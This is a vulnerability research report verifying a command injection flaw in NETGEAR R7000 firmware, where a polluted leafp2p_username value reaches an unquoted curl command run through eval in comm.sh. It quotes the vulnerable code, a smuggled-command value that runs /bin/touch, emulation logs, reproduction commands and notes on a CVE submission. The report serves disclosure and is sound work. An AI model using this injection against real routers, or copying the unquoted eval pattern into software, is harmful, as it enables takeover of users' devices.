# NETGEAR R7000 ReadyCLOUD RCE Verification

Date: 2026-06-08

Target:

- NETGEAR R7000 firmware `V1.0.9.18_1.2.27`
- Rootfs: `inout/firmware/unpacked/netgear/R7000-V1.0.9.18_1.2.27/_R7000-V1.0.9.18_1.2.27.chk.extracted/squashfs-root`

## Result

Stable command execution was verified in the ReadyCLOUD registration path when `leafp2p_username` is attacker-polluted before registration.

Verified chain:

`leafp2p_username` NVRAM value -> `readycloud_control.cgi` -> `readycloud_hostname` -> `register.sh` -> `comm.sh` -> unquoted `curl --user` command -> `/bin/touch /tmp/pwned`

The dynamic proof produced `/tmp/pwned` in the emulated rootfs.

The PoC was re-run after workspace cleanup by extracting the original firmware image again with `binwalk`. Two consecutive fresh runs both reproduced the same chain and created `/tmp/pwned`.

## Vulnerable Code

`opt/broken/comm.sh` reads NVRAM-derived authentication material and inserts it into a shell command without quoting:

- line 14: `NAS_NAME=\`readycloud_nvram get readycloud_hostname\``
- line 15: `NAS_PASS=\`readycloud_nvram get readycloud_password\``
- line 20: `COMM_EXEC="curl --basic -k --user ${NAS_NAME}:${NAS_PASS} --url ${URL}"`
- line 47: `FULL_EXEC="\`cat "${1}" | ${COMM_EXEC} -X POST --data-binary @- 2>/dev/null\`"`
- line 53: `eval COMM_RESULT="${FULL_EXEC}" || return $ERROR`

`readycloud_control.cgi` copies `leafp2p_username` into `readycloud_hostname` during ReadyCLOUD registration startup. The verified runtime log shows:

```text
GET=leafp2p_username
readycloud_hostname=routeruser; /bin/touch /tmp/pwned; #
COMMIT=1
GET=leafp2p_password
readycloud_password=routerpass
COMMIT=1
```

## Dynamic Evidence

Verification script:

- `scripts/verify_netgear_readycloud_leafp2p_to_comm_rce.sh`

Evidence:

- `inout/work/deepdive/netgear_readycloud_comm_rce_2026_06_08/leafp2p_to_comm_rce_evidence.txt`
- `inout/work/deepdive/netgear_readycloud_comm_rce_2026_06_08/leafp2p_to_comm_rce_evidence_rerun_1.txt`
- `inout/work/deepdive/netgear_readycloud_comm_rce_2026_06_08/leafp2p_to_comm_rce_evidence_rerun_2.txt`

Key evidence excerpts:

```text
Using routeruser; /bin/touch /tmp/pwned; # as device username (length - 36
Calling register.sh with line /opt/broken/register.sh 'alice@example.com' 'plainpass'
```

The command wrapper log confirms the malformed `curl --user` command was split by the shell at the semicolon:

```text
curl --basic -k --user routeruser
```

The side effect was created:

```text
[pwned]
-rw-r--r-- 1 root root 0 Jun  8 12:12 /tmp/netgear_readycloud_comm_rce_rerun_1/rootfs/tmp/pwned
-rw-r--r-- 1 root root 0 Jun  8 12:12 /tmp/netgear_readycloud_comm_rce_rerun_2/rootfs/tmp/pwned
```

## Reproducibility Status

Current status: stable and reproducible under the stated precondition.

The verification script now supports `WORK` and `ORIG` environment overrides. After extracting the firmware image into `/tmp/r7000_extract`, this command was used for fresh replay:

```sh
ORIG=/tmp/r7000_extract/_R7000-V1.0.9.18_1.2.27.chk.extracted/squashfs-root \
WORK=/tmp/netgear_readycloud_comm_rce_rerun_1 \
bash /root/scripts/verify_netgear_readycloud_leafp2p_to_comm_rce.sh
```

The host-side evidence check found all required indicators in both reruns:

- `readycloud_hostname=routeruser; /bin/touch /tmp/pwned; #`
- `curl --basic -k --user routeruser`
- `[pwned]` followed by a real `/tmp/.../rootfs/tmp/pwned` file listing

Because `docker cp` cannot reliably restore firmware symlinks into the Windows workspace, the restored extracted firmware tree was archived instead:

- `inout/firmware/unpacked/netgear/R7000-V1.0.9.18_1.2.27/R7000-V1.0.9.18_1.2.27.chk.extracted.tar.gz`

## Duplicate CVE Check

Local and public duplicate checks did not identify a known CVE for this exact chain.

Checked local materials:

- `inout/vulndb/target_vuln_screening.csv`
- `inout/vulndb/target_vuln_screening.md`
- `inout/vulndb/reports/netgear/*`
- existing project reports and CVE submission material

Nearby but different items:

- `CVE-2022-30078` and `CVE-2022-27632` appear in local R7000 candidate data, but they are anchored to other `acosNvramConfig_get` / `system` patterns such as `ipv6_wan_ipaddr` or `ddns_status`, not ReadyCLOUD `leafp2p_username -> readycloud_hostname -> comm.sh`.
- `CVE-2024-35520` / `RMT_invite.cgi` is a different legacy remote invite CGI/eval path, not this ReadyCLOUD `usb_remote_invite.cgi` / `readycloud_control.cgi` / `comm.sh` chain.

Public search terms used included:

- `NETGEAR R7000 V1.0.9.18 ReadyCLOUD command injection leafp2p_username`
- `"leafp2p_username" "NETGEAR"`
- `"readycloud_hostname" "comm.sh" "NETGEAR"`
- `"usb_remote_invite.cgi" "NETGEAR" CVE`
- `"readycloud_control.cgi" "CVE"`
- `"comm.sh" "readycloud_nvram"`

No public result found in this pass matched the same source key, propagation path, and shell sink.

## CVE Submission Value

Submission value: conditional but meaningful.

This finding has CVE value if the submission clearly states the precondition: arbitrary or attacker-controlled pollution of `leafp2p_username` before ReadyCLOUD registration. Under that condition, the RCE is stable, reaches a real shell sink, and executes a command side effect.

For a stronger CVE submission, the next missing proof is a remote or authenticated web/API primitive that writes metacharacters into `leafp2p_username`. Without that upstream write primitive, the vulnerability should be submitted as an RCE sink reachable from polluted persistent configuration state, not as a fully proven standalone remote unauthenticated RCE.

## Scope Boundary

This is a stable RCE sink and a stable ReadyCLOUD registration trigger under a polluted `leafp2p_username` state.

The remaining work is to prove a remote or web-reachable primitive that writes arbitrary metacharacters into `leafp2p_username`. Current string evidence shows `httpd`, `acos_service`, `api`, `readycloud_control.cgi`, and `leafp2p` reference this key, but this pass did not yet prove an external request directly controls it.

Direct injection through the ReadyCLOUD registration JSON `owner` and `password` fields was tested separately and did not produce command execution because the parser truncates/rejects shell metacharacters.

## Reproduce

From the project root:

```powershell
docker cp .\scripts\verify_netgear_readycloud_leafp2p_to_comm_rce.sh firmrec-dev-run:/root/scripts/verify_netgear_readycloud_leafp2p_to_comm_rce.sh
docker exec firmrec-dev-run bash /root/scripts/verify_netgear_readycloud_leafp2p_to_comm_rce.sh
docker cp firmrec-dev-run:/root/inout/work/deepdive/netgear_readycloud_comm_rce_2026_06_08/leafp2p_to_comm_rce_evidence.txt .\inout\work\deepdive\netgear_readycloud_comm_rce_2026_06_08\leafp2p_to_comm_rce_evidence.txt
```
